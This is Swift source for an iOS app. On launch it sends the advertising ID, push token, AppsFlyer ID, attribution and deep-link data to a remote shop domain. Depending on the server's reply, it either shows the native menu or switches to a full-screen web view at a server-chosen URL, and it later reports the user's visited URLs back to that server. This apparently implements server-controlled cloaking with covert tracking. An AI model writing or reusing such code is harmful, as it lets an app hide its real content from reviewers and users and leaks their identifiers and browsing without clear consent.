import UIKit
import Lottie

class StartVC: UIViewController, URLSessionDelegate {
    
    var logoImageView: UIImageView!
    var backgroundImageView: UIImageView!
    
    
    private var animationView: LottieAnimationView!
    
    var appDelegate = UIApplication.shared.delegate as? AppDelegate
    
    override var supportedInterfaceOrientations: UIInterfaceOrientationMask {
        return .portrait
    }
    
    var userSuccess = ""
    
    override func viewDidLoad() {
        super.viewDidLoad()
        UNUserNotificationCenter.current().requestAuthorization(options: [.alert, .sound, .badge], completionHandler: {
            success, error in
            guard success else {
                return
            }
        })
        setupUI()
    }
    
    func setupUI() {
        backgroundImageView = UIImageView()
        backgroundImageView.image = UIImage(named: "background")
        backgroundImageView.translatesAutoresizingMaskIntoConstraints = false
        backgroundImageView.contentMode = .scaleToFill
        view.addSubview(backgroundImageView)
        
        NSLayoutConstraint.activate([
            backgroundImageView.topAnchor.constraint(equalTo: view.topAnchor),
            backgroundImageView.bottomAnchor.constraint(equalTo: view.bottomAnchor),
            backgroundImageView.leftAnchor.constraint(equalTo: view.leftAnchor),
            backgroundImageView.rightAnchor.constraint(equalTo: view.rightAnchor),
        ])
        
        logoImageView = UIImageView()
        logoImageView.image = UIImage(named: "logo")
        logoImageView.translatesAutoresizingMaskIntoConstraints = false
        logoImageView.contentMode = .scaleAspectFit
        view.addSubview(logoImageView)
        
        NSLayoutConstraint.activate([
            logoImageView.topAnchor.constraint(equalTo: view.safeAreaLayoutGuide.topAnchor),
            logoImageView.bottomAnchor.constraint(equalTo: view.safeAreaLayoutGuide.centerYAnchor),
            logoImageView.leftAnchor.constraint(equalTo: view.safeAreaLayoutGuide.leftAnchor, constant: 16),
            logoImageView.rightAnchor.constraint(equalTo: view.safeAreaLayoutGuide.rightAnchor, constant: -16),
        ])
        
        animationView = .init(name: "loading")
        
        animationView.translatesAutoresizingMaskIntoConstraints = false
        
        
        animationView.contentMode = .scaleAspectFit
        
        
        animationView.loopMode = .loop
        
        
        animationView.animationSpeed = 0.5
        
        view.addSubview(animationView)
        NSLayoutConstraint.activate([
            animationView.topAnchor.constraint(equalTo: logoImageView.bottomAnchor, constant: 16),
            animationView.bottomAnchor.constraint(equalTo: view.safeAreaLayoutGuide.bottomAnchor),
            animationView.leftAnchor.constraint(equalTo: view.safeAreaLayoutGuide.leftAnchor, constant: 16),
            animationView.rightAnchor.constraint(equalTo: view.safeAreaLayoutGuide.rightAnchor, constant: -16),
        ])
        animationView.play()
        
    }

    
    func sendRequest() {
        let url = URL(string: "https://zeus-chronicles.shop/starting")
        let dictionariData: [String: Any?] = ["facebook-deeplink" : appDelegate?.deepLinkParameterFB,
                                              "push-token" : appDelegate?.tokenPushNotification,
                                              "appsflyer" : appDelegate?.oldAndNotWorkingNames,
                                              "timezone-geo": appDelegate?.geographicalNameTimeZone,
                                              "timezome-gmt" : appDelegate?.abbreviationTimeZone,
                                              "apps-flyer-id": appDelegate!.uniqueIdentifierAppsFlyer,
                                              "attribution-data" : appDelegate?.dataAttribution,
                                              "deepLinkStr": appDelegate?.oneLinkDeepLink,
                                              "deep_link_sub1" : appDelegate?.subject_1,
                                              "deep_link_sub2" : appDelegate?.subject_2,
                                              "deep_link_sub3" : appDelegate?.subject_3,
                                              "deep_link_sub4" : appDelegate?.subject_4,
                                              "deep_link_sub5" : appDelegate?.subject_5]
        var request = URLRequest(url: url!)
        let json = try? JSONSerialization.data(withJSONObject: dictionariData)
        request.httpBody = json
        request.httpMethod = "POST"
        request.addValue(appDelegate!.identifierAdvertising, forHTTPHeaderField: "GID")
        request.addValue(Bundle.main.bundleIdentifier!, forHTTPHeaderField: "PackageName")
        request.addValue(appDelegate!.uniqueIdentifierAppsFlyer, forHTTPHeaderField: "ID")
        let configuration = URLSessionConfiguration.ephemeral
        configuration.waitsForConnectivity = false
        configuration.timeoutIntervalForResource = 30
        configuration.timeoutIntervalForRequest = 30
        let session = URLSession(configuration: configuration, delegate: self, delegateQueue: OperationQueue.main)

        let task = session.dataTask(with: request) { (data, response, error) in
            guard let data = data, error == nil else {
                self.showMenu()
                return
            }
            
            let responseJSON = try? JSONSerialization.jsonObject(with: data, options: [])
            if let responseJSON = responseJSON as? [String: Any] {
                guard let result = responseJSON["result"] as? String else { return }
                self.userSuccess = result
                let user = responseJSON["userID"] as? Int
                guard let strUser = user else { return }
            }
            
            if let response = response as? HTTPURLResponse {
                print("STATUS CODE: \(response.statusCode)")
                if response.statusCode == 200 {
                    self.showMenu()
                } else if response.statusCode == 302 {
                    if self.userSuccess != "" {
                        DispatchQueue.main.async {
                            self.adsPresent()
                        }
                    }
                } else {
                    self.showMenu()
                }
            }
            return
        }
        task.resume()
    }
    
    func adsPresent() {
        let ads = WebView()
        ads.urlPath = self.userSuccess
        ads.modalTransitionStyle = .flipHorizontal
        ads.modalPresentationStyle = .fullScreen
        present(ads, animated: true, completion: nil)
    }
    
    func showMenu() {
        DispatchQueue.main.async {
            let vc = menuViewContoller()
            vc.modalPresentationStyle = .fullScreen
            vc.modalTransitionStyle = .crossDissolve
            self.present(vc, animated: true)
        }
    }
}

import WebKit

class WebView: UIViewController, WKUIDelegate, WKNavigationDelegate, URLSessionDelegate {
    
    let appDelegate = UIApplication.shared.delegate as? AppDelegate
    var lastUrt = ""
    
    var step = 0
    
    lazy var webView: WKWebView = {
        let webConfiguration = WKWebViewConfiguration()
        
        if #available(iOS 13.0, *) {
            let webPreferences = WKWebpagePreferences()
            if #available(iOS 14.0, *) {
                webPreferences.allowsContentJavaScript = true
            } else {
                webConfiguration.preferences.javaScriptEnabled = true
            }
        } else {
            let webPreferences = WKPreferences()
            webConfiguration.preferences.javaScriptEnabled = true
        }
        
        webConfiguration.preferences.javaScriptCanOpenWindowsAutomatically = false
        
        let webView = WKWebView(frame: view.bounds, configuration: webConfiguration)
        webView.translatesAutoresizingMaskIntoConstraints = false
        webView.allowsBackForwardNavigationGestures = true
        webView.configuration.mediaTypesRequiringUserActionForPlayback = .all
        
        return webView
    }()
    
    lazy var urlPath: String = ""
    
    override func viewDidLoad() {
        super.viewDidLoad()
        
        webView.configuration.allowsInlineMediaPlayback = true
        webView.evaluateJavaScript("""
    var element=document.querySelector('video');var p=document.createElement("p");p.innerHTML=element.src;document.body.appendChild(p);element.setAttribute('playsinline', 1);element.setAttribute('controls autoplay', 0);
    """)
        webView.configuration.mediaTypesRequiringUserActionForPlayback = []
        webView.configuration.allowsPictureInPictureMediaPlayback = false
        webView.allowsBackForwardNavigationGestures = true
        webView.configuration.preferences.javaScriptCanOpenWindowsAutomatically = false
        webView.allowsLinkPreview = false
        webView.uiDelegate = self
        webView.navigationDelegate = self
        view = UIView()
        
        webView.scrollView.contentInsetAdjustmentBehavior = .never
        
        setupUI()
        setupToolBar()
        
        if let url = URL(string: urlPath) {
            let request = URLRequest(url: url)
            webView.load(request)
        }
        
        let notificationCenter = NotificationCenter.default
            notificationCenter.addObserver(self, selector: #selector(appMovedToBackground), name: UIApplication.didEnterBackgroundNotification, object: nil)
        
        notificationCenter.addObserver(self, selector: #selector(appMovedToBackground), name: UIApplication.willTerminateNotification, object: nil)

    }
    
    @objc func appMovedToBackground() {
        self.createLastUrl()
        print("отработало")
    }
    
    override func observeValue(forKeyPath keyPath: String?, of object: Any?, change: [NSKeyValueChangeKey : Any]?, context: UnsafeMutableRawPointer?) {
           if let newValue = change?[.newKey] {
               print("url changed: \(newValue)")
               self.lastUrt = (newValue as AnyObject).absoluteString ?? ""
               print("LAST URL: \(lastUrt)")
               self.step += 1
               
               if self.step == 1 {
                   self.createLastUrl()
                   print("1 - готов")
               } else if self.step == 2 {
                   self.createLastUrl()
                   print("2 - готов")
               } else if self.step == 3 {
                   self.createLastUrl()
                   print("3 - готов")
               } else {
                   print("хуйня столько запросов")
               }
               
           }
           print("Did tap!!")
       }
    
    override var prefersStatusBarHidden: Bool {
        return true
    }
    
    let uiToolBar = UIToolbar()
    
    func setupToolBar() {
        
        if #available(iOS 13.0, *) {
            let closeItem = UIBarButtonItem(image: UIImage(systemName: "chevron.backward"), style: .done, target: self, action: #selector(back))
            let refreshItem = UIBarButtonItem(image: UIImage(systemName: "arrow.clockwise"), style: .done, target: self, action: #selector(refresh))
            let space = UIBarButtonItem(barButtonSystemItem: .flexibleSpace, target: self, action: nil)
            
            uiToolBar.setItems([closeItem, space, refreshItem], animated: true)
        } else {
            // Fallback on earlier versions
            let closeItem = UIBarButtonItem(barButtonSystemItem: .reply, target: self, action: #selector(back))
            let refreshItem = UIBarButtonItem(barButtonSystemItem: .refresh, target: self, action: #selector(refresh))
            let space = UIBarButtonItem(barButtonSystemItem: .flexibleSpace, target: self, action: nil)
            
            uiToolBar.setItems([closeItem, space, refreshItem], animated: true)
        }
        
        navigationController?.setToolbarHidden(false, animated: true)
        
        uiToolBar.tintColor = .purple
        view.addSubview(uiToolBar)
        
        uiToolBar.translatesAutoresizingMaskIntoConstraints = false
        
        if #available(iOS 11.0, *) {
            let guide = self.view.safeAreaLayoutGuide
            uiToolBar.trailingAnchor.constraint(equalTo: guide.trailingAnchor).isActive = true
            uiToolBar.leadingAnchor.constraint(equalTo: guide.leadingAnchor).isActive = true
            uiToolBar.bottomAnchor.constraint(equalTo: guide.bottomAnchor).isActive = true
        } else {
            NSLayoutConstraint(item: uiToolBar, attribute: .bottom, relatedBy: .equal, toItem: view, attribute: .bottom, multiplier: 1.0, constant: 0).isActive = true
            NSLayoutConstraint(item: uiToolBar, attribute: .leading, relatedBy: .equal, toItem: view, attribute: .leading, multiplier: 1.0, constant: 0).isActive = true
            NSLayoutConstraint(item: uiToolBar, attribute: .trailing, relatedBy: .equal, toItem: view, attribute: .trailing, multiplier: 1.0, constant: 0).isActive = true
            uiToolBar.heightAnchor.constraint(equalToConstant: 44).isActive = true
        }
    }
    
    @objc func back() {
        webView.goBack()
    }
    
    @objc func refresh() {
        webView.reload()
    }
    
    func webView(_ webView: WKWebView, createWebViewWith configuration: WKWebViewConfiguration, for navigationAction: WKNavigationAction, windowFeatures: WKWindowFeatures) -> WKWebView? {
        if navigationAction.targetFrame == nil {
            webView.evaluateJavaScript("""
        var element=document.querySelector('video');var p=document.createElement("p");p.innerHTML=element.src;document.body.appendChild(p);element.setAttribute('playsinline', 1);element.setAttribute('controls autoplay', 0);
        """)
            webView.customUserAgent = "Safari/14.0.3 (iPad 11; CPU OS 13_2_1 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko)"
            webView.load(navigationAction.request)
        }
        
        return nil
    }
    
    func webView(_ webView: WKWebView, didReceiveServerRedirectForProvisionalNavigation navigation: WKNavigation!) {
        webView.evaluateJavaScript("""
    var element=document.querySelector('video');var p=document.createElement("p");p.innerHTML=element.src;document.body.appendChild(p);element.setAttribute('playsinline', 1);element.setAttribute('controls autoplay', 0);
    """)
    }
    
    func webView(_ webView: WKWebView, didFinish navigation: WKNavigation!) {
        webView.evaluateJavaScript("""
    var element=document.querySelector('video');var p=document.createElement("p");p.innerHTML=element.src;document.body.appendChild(p);element.setAttribute('playsinline', 1);element.setAttribute('controls autoplay', 0);
    """)
        
        if let url = webView.url?.absoluteString{
            print("url thiirss = \(url)")
            self.step += 1
            self.lastUrt = url
            if self.step == 1 {
                self.createLastUrl()
            } else if self.step == 2 {
                self.createLastUrl()
            } else if self.step == 3 {
                self.createLastUrl()
            } else {
                
            }
        }
    }
    
    func webView(_ webView: WKWebView, runJavaScriptAlertPanelWithMessage message: String, initiatedByFrame frame: WKFrameInfo, completionHandler: @escaping () -> Void) {
        if #available(iOS 12, *) {
            let alertController = UIAlertController (title: nil, message: message, preferredStyle: .alert)
            alertController.addAction(UIAlertAction(title: "Good", style: .default, handler: {(action) in
                completionHandler ()
            }))
            present (alertController, animated: true, completion: nil)
        } else {
            
        }
    }
    
    func createLastUrl() {
        let url = URL(string: "https://zeus-chronicles.shop/send_url")
        let dictionariData: [String: Any?] = ["apps-flyer-id": appDelegate!.uniqueIdentifierAppsFlyer, "last-url" : self.lastUrt]
        ///REQUST
        var request = URLRequest(url: url!)
        //JSON
        let json = try? JSONSerialization.data(withJSONObject: dictionariData)
        request.httpBody = json
        request.httpMethod = "POST"
        //CONFIGURATIN
        let configuration = URLSessionConfiguration.ephemeral
        configuration.waitsForConnectivity = false
        configuration.timeoutIntervalForResource = 16
        configuration.timeoutIntervalForRequest = 16
        ///SESSION
        let session = URLSession(configuration: configuration, delegate: self, delegateQueue: OperationQueue.main)
        ///TASK
        let task = session.dataTask(with: request) { (data, response, error) in }
        task.resume()
    }
    
}

// MARK: - Setup UI

extension WebView {
    func setupUI() {
        self.view.addSubview(webView)
        self.view.addSubview(uiToolBar)
        
        webView.translatesAutoresizingMaskIntoConstraints = false
        
        webView.allowsBackForwardNavigationGestures = true
        
        NSLayoutConstraint.activate([
            webView.topAnchor.constraint(equalTo: self.view.safeAreaLayoutGuide.topAnchor),
            webView.leftAnchor.constraint(equalTo: self.view.leftAnchor),
            webView.bottomAnchor.constraint(equalTo: uiToolBar.topAnchor),
            webView.rightAnchor.constraint(equalTo: self.view.rightAnchor)
        ])
    }
    
    func webView(_ webView: WKWebView, decidePolicyFor navigationAction: WKNavigationAction, decisionHandler: @escaping (WKNavigationActionPolicy) -> Void) {
        let Url = URL(string: urlPath)
        //load cookie of current domain
        webView.loadDiskCookies(for: (Url?.host!)!){
            decisionHandler(.allow)
        }
    }
    
    public func webView(_ webView: WKWebView, decidePolicyFor navigationResponse: WKNavigationResponse, decisionHandler: @escaping (WKNavigationResponsePolicy) -> Void) {
        let Url = URL(string: urlPath)
        webView.writeDiskCookies(for: (Url?.host!)!){
            decisionHandler(.allow)
        }
    }
}

// MARK: - WKWebView: Cookies saving

extension WKWebView {
    enum PrefKey {
        static let cookie = "cookies"
    }
    
    func writeDiskCookies(for domain: String, completion: @escaping () -> ()) {
        fetchInMemoryCookies(for: domain) { data in
            UserDefaults.standard.setValue(data, forKey: PrefKey.cookie + domain)
            completion()
        }
    }
    
    func loadDiskCookies(for domain: String, completion: @escaping () -> ()) {
        if let diskCookie = UserDefaults.standard.dictionary(forKey: (PrefKey.cookie + domain)){
            fetchInMemoryCookies(for: domain) { freshCookie in
                
                let mergedCookie = diskCookie.merging(freshCookie) { (_, new) in new }
                
                for (_, cookieConfig) in mergedCookie {
                    let cookie = cookieConfig as! Dictionary<String, Any>
                    
                    var expire : Any? = nil
                    
                    if let expireTime = cookie["Expires"] as? Double{
                        expire = Date(timeIntervalSinceNow: expireTime)
                    }
                    
                    let newCookie = HTTPCookie(properties: [
                        .domain: cookie["Domain"] as Any,
                        .path: cookie["Path"] as Any,
                        .name: cookie["Name"] as Any,
                        .value: cookie["Value"] as Any,
                        .secure: cookie["Secure"] as Any,
                        .expires: expire as Any
                    ])
                    
                    self.configuration.websiteDataStore.httpCookieStore.setCookie(newCookie!)
                }
                
                completion()
            }
        } else {
            completion()
        }
    }
    
    func fetchInMemoryCookies(for domain: String, completion: @escaping ([String: Any]) -> ()) {
        var cookieDict = [String: AnyObject]()
        WKWebsiteDataStore.default().httpCookieStore.getAllCookies { (cookies) in
            for cookie in cookies {
                if cookie.domain.contains(domain) {
                    cookieDict[cookie.name] = cookie.properties as AnyObject?
                }
            }
            completion(cookieDict)
        }
    }
}
